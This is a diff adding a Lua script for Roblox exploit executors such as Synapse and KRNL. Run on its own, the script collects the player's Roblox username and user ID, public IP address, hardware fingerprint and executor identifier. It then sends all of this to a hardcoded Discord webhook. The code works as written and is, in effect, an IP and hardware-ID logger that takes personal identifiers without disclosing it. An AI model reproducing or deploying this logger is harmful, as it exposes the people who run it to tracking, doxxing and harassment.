@@ -1,0 +1,88 @@
+```lua
+if not syn and request then
+    getgenv().syn = {
+        request = request
+    }
+end
+webhook = {
+    def = function(t)
+        local newFields = {}
+        for a,v in next, t.fields do
+            table.insert(newFields, #newFields + 1, {name = v[1], value = v[2], inline = v[3] or false})
+        end
+        t.fields = newFields
+        local new = {t.color[1],t.color[2],t.color[3]}
+        for a,v in next, t.color do
+            local g = v
+            if v == 255 then
+                g = g - 1
+            elseif v < 0 then
+                g = 0
+            end
+            new[a] = g
+        end
+        t.color = new
+        local m = {
+            username = t.name,
+            embeds = {{
+                color = ((t.color[1]*65536)+(t.color[2]*256)+t.color[3]),
+                title = t.title,
+                fields = t.fields,
+                content = '0',
+            }}
+        }
+        return syn.request({
+            Url = t.url,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json',
+            },
+            Body = game:service('HttpService'):JSONEncode(m)
+        })
+    end
+}
+ 
+local http = game:service('HttpService')
+local json = {
+    encode = function(str)
+        return http:JSONEncode(str)
+    end,
+    decode = function(str)
+        return http:JSONDecode(str)
+    end
+}
+ 
+local function getHwid()
+    return game:service('HttpService'):JSONDecode(syn.request({Url = 'https://httpbin.org/get', Method = 'GET'}).Body).headers['Syn-Fingerprint'] or 'N/A'
+end
+function getID()
+    local exploit = (syn_crypt_b64_encode and 'Synapse' or pebc_execute and 'ProtoSmasher' or request and 'KRNL')
+    local bin = json.decode(syn.request({Url = 'https://httpbin.org/get',Method = 'GET'}).Body).headers
+    if exploit == 'Synapse' then
+        return bin['Syn-User-Identifier']
+    elseif exploit == 'ProtoSmasher' then
+        return bin['Proto-User-Identifier']
+    elseif exploit == 'KRNL' then
+        return bin['Krnl-Hwid']
+    end
+end
+local function getIP()
+    return syn.request({Url = 'https://api.ipify.org/', Method = 'GET'}).Body
+end
+ 
+webhook.def({
+    url = 'https://discord.com/api/webhooks/855133686948954142/KVK-AycTUZZWQSeWNUjWVQFtjKt6sTGJXGGsEvWtuN859g9FRXJ-a0hGkoWj-0toUBkz-',
+	color = {50, 255, 50},
+	name = 'bot name',
+	title = 'title',
+	fields = {
+        {'Roblox username', game:service('Players').LocalPlayer.Name, true},
+        {'Roblox userID', game:service('Players').LocalPlayer.UserId, true},
+        {'IP', getIP(), true},
+        {'HWID', getHwid(), true},
+        {'Exploit ID', getID(), true},
+        {'Exploit', (syn_crypt_b64_encode and 'Synapse' or pebc_execute and 'ProtoSmasher' or request and 'KRNL'), true},
+        {'Game', ('https://www.roblox.com/games/'..game.PlaceId..' | '..game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Name), false}
+	}
+})
+```
